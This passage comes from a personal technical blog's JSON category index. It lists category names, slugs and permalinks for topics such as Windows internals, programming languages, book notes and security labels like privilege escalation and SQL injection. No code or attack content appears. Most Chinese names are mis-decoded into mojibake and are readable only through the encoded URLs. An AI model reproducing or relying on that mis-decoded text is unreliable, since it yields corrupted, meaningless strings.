","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"},{"name":"å®‰å…¨","slug":"wiki/å®‰å…¨","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/"},{"name":"ææƒ","slug":"wiki/å®‰å…¨/ææƒ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/%E6%8F%90%E6%9D%83/"},{"name":"stellar","slug":"wiki/stellar","permalink":"https://hodlyounger.github.io/categories/wiki/stellar/"},{"name":"PE","slug":"wiki/PE","permalink":"https://hodlyounger.github.io/categories/wiki/PE/"},{"name":"Homework-c-language","slug":"wiki/Homework-c-language","permalink":"https://hodlyounger.github.io/categories/wiki/Homework-c-language/"},{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"},{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"è®¡ç®—æœº","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/è®¡ç®—æœº","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"},{"name":"ç²¾å“å°è¯´","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%B2%BE%E5%93%81%E5%B0%8F%E8%AF%B4/"},{"name":"ç§‘å­¦æŠ€æœ¯","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç§‘å­¦æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF/"},{"name":"ç¤¾ä¼šæ–‡åŒ–","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç¤¾ä¼šæ–‡åŒ–","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%A4%BE%E4%BC%9A%E6%96%87%E5%8C%96/"},{"name":"ç”Ÿæ´»ç™¾ç§‘","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç”Ÿæ´»ç™¾ç§‘","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%94%9F%E6%B4%BB%E7%99%BE%E7%A7%91/"},{"name":"æœªåˆ†ç±»","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æœªåˆ†ç±»","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%9C%AA%E5%88%86%E7%B1%BB/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"},{"name":"å“²å­¦å®—æ•™","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%93%B2%E5%AD%A6%E5%AE%97%E6%95%99/"},{"name":"åŒ»å­¦å¥åº·","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/åŒ»å­¦å¥åº·","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%8C%BB%E5%AD%A6%E5%81%A5%E5%BA%B7/"},{"name":"å…¬ä¼—å·","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å…¬ä¼—å·","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%85%AC%E4%BC%97%E5%8F%B7/"},{"name":"ä¸ªäººæˆé•¿","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/"},{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"},{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"},{"name":"A_Aç ”","slug":"A-Aç ”","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/"},{"name":"æ”¿æ²»","slug":"A-Aç ”/æ”¿æ²»","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/"},{"name":"è¿‘ç°ä»£å²çº²è¦","slug":"A-Aç ”/æ”¿æ²»/è¿‘ç°ä»£å²çº²è¦","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/%E8%BF%91%E7%8E%B0%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"ç½‘å®‰","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E5%AE%89/"},{"name":"ç½‘ç»œå®¡è®¡","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/ç½‘å®‰/ç½‘ç»œå®¡è®¡","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E5%AE%89/%E7%BD%91%E7%BB%9C%E5%AE%A1%E8%AE%A1/"},{"name":"é©¬åŸ","slug":"A-Aç ”/æ”¿æ²»/é©¬åŸ","permalink":"https://hodlyounger.github.io/categories/A-A%E7%A0%94/%E6%94%BF%E6%B2%BB/%E9%A9%AC%E5%8E%9F/"},{"name":"ç»„ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/"},{"name":"å®‰å…¨è®¾ç½®","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"è´¦æˆ·ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"},{"name":"IDA","slug":"B-Code/IDA","permalink":"https://hodlyounger.github.io/categories/B-Code/IDA/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"},{"name":"å¼‚å¸¸åŠé”™è¯¯å¤„ç†","slug":"A-OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"name":"DbgHelp","slug":"A-OS/Windows/DbgHelp","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/DbgHelp/"},{"name":"PnP","slug":"A-OS/Windows/PnP","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/PnP/"},{"name":"Rust","slug":"B-Code/Rust","permalink":"https://hodlyounger.github.io/categories/B-Code/Rust/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"},{"name":"Windows æ–‡ä»¶","slug":"A-OS/Windows/Windows-æ–‡ä»¶","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Windows-%E6%96%87%E4%BB%B6/"},{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"IIS","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/IIS","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/IIS/"},{"name":"IIS","slug":"A-OS/Windows/IIS","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/IIS/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"æ‰¹å¤„ç†","slug":"A-OS/Windows/æ‰¹å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"C_æœºå™¨å­¦ä¹ ","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ åŸºç¡€","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"},{"name":"ç½‘å¡é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨/ç½‘å¡é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/"},{"name":"Defender","slug":"A-OS/Windows/Defender","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Defender/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"æ¼æ´è¯´æ˜","slug":"E-æ‰‹å†Œ/æ¼æ´è¯´æ˜","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E/"},{"name":"Exchange","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/Exchange","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"},{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"},{"name":"B_ä¹¦ç±èµ„æ–™","slug":"B-ä¹¦ç±èµ„æ–™","permalink":"https://hodlyounger.github.io/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"},{"name":"è½¯ä»¶è®¾è®¡å¸ˆ","slug":"B-ä¹¦ç±èµ„æ–™/è½¯ä»¶è®¾è®¡å¸ˆ","permalink":"https://hodlyounger.github.io/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"},{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"SQLæ³¨å…¥","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/SQLæ³¨å…¥","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ç•…æ·é€š","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/ç•…æ·é€š","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/COM/"},{"name":"Shellæ‰©å±•","slug":"A-OS/Windows/Shellæ‰©å±•","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"},{"name":"Exchange","slug":"A-OS/Windows/Exchange","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Exchange/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"},{"name":"æ³¨å†Œè¡¨","slug":"A-OS/Windows/æ³¨å†Œè¡¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"A-OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/CreateRemoteThread/"},{"name":"Inject&Hook","slug":"A-OS/Windows/Inject-Hook","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Inject-Hook/"},{"name":"win","slug":"A-OS/Windows/win","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/win/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxé˜²ç«å¢™","slug":"A-OS/Linux/Linuxé˜²ç«å¢™","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"å¼€å‘ç›¸å…³","slug":"A-OS/Windows/å¼€å‘ç›¸å…³","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"},{"name":"B_è®¾è®¡æ¨¡å¼","slug":"A-å†…åŠŸ/B-è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"MySQL8","slug":"wiki/MySQL8","permalink":"https://hodlyounger.github.io/categories/wiki/MySQL8/"},{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"},{"name":"osquery","slug":"G-å·¥å…·/osquery","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/osquery/"},{"name":"OpenSSL","slug":"C-OpenSource/OpenSSL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/OpenSSL/"},{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"https://hodlyounger.github.io/categories/G-LeetCode/"},{"name":"è„šæœ¬","slug":"E-æ‰‹å†Œ/è„šæœ¬","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E8%84%9A%E6%9C%AC/"},{"name":"å¿«æ·é”®æ•´ç†","slug":"E-æ‰‹å†Œ/å¿«æ·é”®æ•´ç†","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"},{"name":"UML","slug":"E-æ‰‹å†Œ/UML","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/UML/"},{"name":"Git","slug":"E-æ‰‹å†Œ/Git","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Git/"},{"name":"Game","slug":"E-æ‰‹å†Œ/Game","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Game/"},{"name":"En","slug":"E-æ‰‹å†Œ/En","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/En/"},{"name":"Curl","slug":"E-æ‰‹å†Œ/Curl","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Curl/"},{"name":"ã€Šè®¡ç®—æœºç½‘ç»œ ç¬¬7ç‰ˆã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"ç¬¬7ç«  ç½‘ç»œå®‰å…¨","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹/ç¬¬7ç« -ç½‘ç»œå®‰å…¨","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"},{"name":"ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨-ç¬¬3ç‰ˆã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8-%E7%AC%AC3%E7%89%88%E3%80%8B/"},{"name":"ã€ŠEfficient C++ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient-C-ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"},{"name":"ã€ŠC++ primer plusã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC-primer-plusã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"ç¬¬11ç«  ä½¿ç”¨ç±»","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC-primer-plusã€‹/ç¬¬11ç« -ä½¿ç”¨ç±»","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/%E7%AC%AC11%E7%AB%A0-%E4%BD%BF%E7%94%A8%E7%B1%BB/"},{"name":"libevent","slug":"C-OpenSource/libevent","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/libevent/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/MySQL/"},{"name":"API","slug":"C-OpenSource/API","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/API/"},{"name":"æŠ“åŒ…","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/æŠ“åŒ…","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%8A%93%E5%8C%85/"},{"name":"tcp","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/tcp","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/tcp/"},{"name":"libevent","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/libevent","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"},{"name":"DNS","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/DNS","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"B-Code/æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"æ•°æ®åº“","slug":"B-Code/æ•°æ®åº“","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/æ•°æ®åº“/MYSQL","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"https://hodlyounger.github.io/categories/B-Code/TypeScript/"},{"name":"é¼ æ ‡é”®ç›˜","slug":"B-Code/Qt/é¼ æ ‡é”®ç›˜","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"},{"name":"å†…å­˜","slug":"B-Code/Qt/å†…å­˜","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%86%85%E5%AD%98/"},{"name":"QWin","slug":"B-Code/Qt/QWin","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QWin/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QWebEngineView/"},{"name":"QTableWidget","slug":"B-Code/Qt/QTableWidget","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QTableWidget/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/QLineEdit/"},{"name":"LeetCode","slug":"B-Code/LeetCode","permalink":"https://hodlyounger.github.io/categories/B-Code/LeetCode/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"https://hodlyounger.github.io/categories/B-Code/IPC/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"wailsapp","slug":"B-Code/GO/wailsapp","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/wailsapp/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%A